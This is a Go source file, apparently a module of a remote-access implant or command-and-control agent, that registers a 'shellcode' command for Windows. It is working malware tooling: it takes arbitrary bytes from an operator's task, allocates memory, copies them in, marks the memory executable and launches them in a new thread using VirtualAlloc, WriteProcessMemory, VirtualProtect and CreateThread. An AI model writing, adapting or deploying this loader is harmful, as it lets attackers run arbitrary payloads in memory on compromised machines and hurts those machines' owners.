package command

import (
	"fmt"
	"log"
	"runtime"
	"syscall"
	"unsafe"
)

// CommandIDShellcode Shellcode 命令 ID
const CommandIDShellcode uint32 = 15

// ShellcodeCommand implements the shellcode execution command.
type ShellcodeCommand struct{}

func init() {
	Register(&ShellcodeCommand{})
}

func (c *ShellcodeCommand) ID() uint32 {
	return CommandIDShellcode
}

func (c *ShellcodeCommand) Name() string {
	return "shellcode"
}

func (c *ShellcodeCommand) Execute(task *Task) ([]byte, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("shellcode execution is only supported on Windows")
	}

	shellcode := task.Arguments
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	log.Printf("Executing shellcode of length %d on Windows...", len(shellcode))

	// Get a handle to the current process
	currentProcess, err := syscall.GetCurrentProcess()
	if err != nil {
		return nil, fmt.Errorf("failed to get current process handle: %v", err)
	}

	// 1. Allocate memory for the shellcode
	addr, _, err := virtualAlloc.Call(
		uintptr(0), // Preferred base address (let system decide)
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, // Allocate and reserve memory
		PAGE_READWRITE)         // Initial protection: read/write
	if addr == 0 {
		return nil, fmt.Errorf("VirtualAlloc failed: %v", err)
	}
	log.Printf("Memory allocated at 0x%x", addr)

	// 2. Copy shellcode into allocated memory
	_, _, err = writeProcessMemory.Call(
		uintptr(currentProcess),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(0)) // BytesWritten is not needed
	if err != nil && err != syscall.Errno(0) { // syscall.Errno(0) often means success for some WinAPI calls
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	log.Println("Shellcode copied to allocated memory.")

	// 3. Change memory protection to PAGE_EXECUTE_READ
	oldProtect := uint32(0)
	_, _, err = virtualProtect.Call(
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ, // New protection: execute/read
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err != syscall.Errno(0) {
		return nil, fmt.Errorf("VirtualProtect failed: %v", err)
	}
	log.Printf("Memory protection changed to PAGE_EXECUTE_READ (old protect: 0x%x)", oldProtect)

	// 4. Create a new thread to execute the shellcode
	threadHandle, _, err := createThread.Call(
		uintptr(0),            // lpThreadAttributes (default security)
		uintptr(0),            // dwStackSize (default size)
		addr,                  // lpStartAddress (address of shellcode)
		uintptr(0),            // lpParameter (no parameter)
		uintptr(0),            // dwCreationFlags (run immediately)
		uintptr(0))            // lpThreadId (thread ID, not needed here)
	if threadHandle == 0 {
		return nil, fmt.Errorf("CreateThread failed: %v", err)
	}
	log.Printf("Thread created with handle 0x%x", threadHandle)

	// Wait for the thread to finish (optional, depends on shellcode behavior)
	// For now, we'll just return immediately. Shellcode might run in background.
	// You might want to wait for a short period or until the thread terminates.
	// For simplicity, we just create and detach.
	
	// Close the thread handle
	syscall.CloseHandle(syscall.Handle(threadHandle))

	return []byte(fmt.Sprintf("Shellcode executed in new thread. PID: %d, Thread Handle: 0x%x", syscall.Getpid(), threadHandle)), nil
}

// Windows API constants and functions
var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
	virtualProtect   = kernel32.MustFindProc("VirtualProtect")
	createThread     = kernel32.MustFindProc("CreateThread")
	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
)

const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_READWRITE = 0x04
	PAGE_EXECUTE_READ = 0x20
)
